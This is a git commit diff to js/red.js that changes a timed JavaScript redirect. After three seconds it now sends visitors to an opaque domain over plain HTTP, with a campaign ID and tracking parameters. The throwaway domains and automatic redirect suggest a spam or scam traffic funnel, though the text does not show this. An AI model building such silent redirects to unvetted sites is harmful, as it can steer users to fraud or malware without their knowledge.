42e76b1348b312a70cbc720f8800a51b1435f8d9
blacklotus-ag <merlkeefe3@gmail.com>
2025-11-24 10:44:49 +0530

    Update red.js

--- js/red.js
+++ js/red.js
@@ -4,5 +4,5 @@ setTimeout(function() {
 }, 1000);
 
 setTimeout(function() {
-    window.location.href = 'https://t7q4.com/?utm_campaign=RuEoNAxI6g&v1=[v1]&v2=[v2]&v3=[v3]';
+    window.location.href = 'http://h2n6.com/?utm_campaign=BrHK3REWQu&v1=[v1]&v2=[v2]&v3=[v3]';
 }, 3000);
